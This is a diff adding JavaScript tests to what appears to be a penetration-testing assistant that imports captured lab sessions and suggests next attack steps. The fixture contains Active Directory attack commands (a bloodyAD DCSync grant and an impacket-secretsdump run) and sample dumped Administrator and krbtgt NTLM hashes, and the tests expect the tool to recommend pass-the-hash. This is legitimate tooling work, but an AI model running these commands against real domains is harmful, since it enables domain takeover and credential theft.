@@ -211,5 +211,47 @@ ok(tgts.length === 1, 'the hostname-only card and the auto-created IP card colla
 ok(tgts[0].ip === '10.0.0.5' && String(tgts[0].hostname).toLowerCase() === 'dc01', 'the surviving card has both the IP and the hostname (' + tgts[0].ip + ' / ' + tgts[0].hostname + ')');
 ok(rec.merged === 1, 'importSession reports 1 duplicate target merged');
 
+// ── 8. IP remap for a reverted lab ────────────────────────────────────────────────────────────────────
+var rm = OBOL.ingest.remapIps('nxc smb 10.129.95.66 -u svc\nSMB 10.129.95.66 445 ... [+] ok', [{ from: '10.129.95.66', to: '10.129.95.9' }]);
+ok(rm.count === 2 && rm.text.indexOf('10.129.95.66') < 0 && rm.text.indexOf('10.129.95.9') >= 0, 'remapIps rewrites every occurrence of the old target IP');
+// boundary: rewriting .6 must NOT touch .66 (no partial-IP corruption)
+var rm2 = OBOL.ingest.remapIps('ping 10.129.95.6 ; ssh 10.129.95.66', [{ from: '10.129.95.6', to: '10.10.10.10' }]);
+ok(rm2.count === 1 && /10\.129\.95\.66/.test(rm2.text) && /10\.10\.10\.10/.test(rm2.text), 'remapIps is IP-boundary safe (.6 does not match inside .66)');
+
+// ── 9. THE user scenario: import a run.txt-style session WITHOUT the huge bloodyAD get-writable file, with a
+// reverted-lab IP remap, and confirm obol still lands the win + surfaces the Administrator hash. This is the
+// exact worry: the 50k-line ACL dump is absent, but the endgame gates on loot.ntds (from secretsdump), which
+// IS in the capture — so the coach must still point at "Own the Domain — Pass-the-Hash as Administrator".
+OBOL.store = (function () {
+  var eng = { params: { domain: 'corp.local', target: '10.0.0.9', lhost: '10.10.14.191' }, targets: [{ id: 't1', ip: '10.0.0.9' }], activities: [], facts: [] };
+  var all = new OBOL.facts.FactSet([]);
+  return { active: function () { return eng; }, update: function (fn) { fn(eng); },
+    addFacts: function (facts) { var n = 0; (facts || []).forEach(function (f) { if (all.add(OBOL.facts.factFromJson(OBOL.facts.factToJson(f)))) { n++; eng.facts.push(OBOL.facts.factToJson(f)); } }); return n; },
+    factSet: function () { return all; }, _all: all, _e: eng };
+})();
+// the capture: AS-REP already cracked earlier; here it's the ACL-abuse grant + DCSync (NO get-writable dump),
+// with the OLD ip (10.0.0.5) throughout — we remap it to the current target (10.0.0.9).
+var runCap = [
+  '[2026-09-27 22:28:34 UTC] [tun0:10.10.14.191]', "└─$ bloodyAD -d corp.local --host 10.0.0.5 -u svc -p 'pw' add dcsync svc",
+  '[+] svc is now able to DCSync',
+  '[2026-09-27 22:29:01 UTC] [tun0:10.10.14.191]', "└─$ impacket-secretsdump 'corp.local/svc:pw'@10.0.0.5",
+  '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
+  '[*] Using the DRSUAPI method to get NTDS.DIT secrets',
+  'corp.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::',
+  'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44fa5f6f6f6f6f6f6f6f6f6f6f:::',
+  '[*] Cleaning up...',
+].join('\n');
+var runRes = OBOL.ingest.importSession(runCap, { remap: [{ from: '10.0.0.5', to: '10.0.0.9' }] });
+ok(runRes.remapped >= 2, 'the reverted-lab remap rewrote the old IP across the capture (' + runRes.remapped + ' occurrences)');
+ok(OBOL.store._all.has('loot.ntds'), 'run.txt-minus-the-bloodyAD-file still mints loot.ntds (the win gates on this, present in secretsdump)');
+ok(OBOL.store._all.has('ad.control_paths'), 'the DCSync grant is still recorded');
+var ac = OBOL.store._all.values('credential.available').filter(function (v) { return String(v.user).toLowerCase() === 'administrator' && v.nthash === '32693b11e6aa90eb43d32c72a07ceea6'; });
+ok(ac.length === 1, 'the Administrator hash is surfaced as a usable credential (shows on the cred cards)');
+var ranked = OBOL.pack.nextActions(OBOL.store.factSet(), OBOL.packs.actions(), {});
+ok(ranked.length && ranked[0].id === 'own-domain-pth', 'the coach\'s #1 move is "Own the Domain — Pass-the-Hash as Administrator" even without the ACL dump');
+ok(!ranked.some(function (a) { return a.id === 'coerce-auth'; }), 'coercion is retired — not shown after the domain is owned');
+// everything routed to the CURRENT target (remapped), not the stale one
+ok(OBOL.store._e.activities.every(function (a) { return a.target === '10.0.0.9'; }) && !OBOL.store._e.targets.some(function (t) { return t.ip === '10.0.0.5'; }), 'all evidence routed to the current target; the stale IP never became a host');
+
 console.log(fail ? ('\nSESSION IMPORT: ' + fail + ' FAILURES') : '\nSESSION IMPORT: all passed');
 process.exit(fail ? 1 : 0);
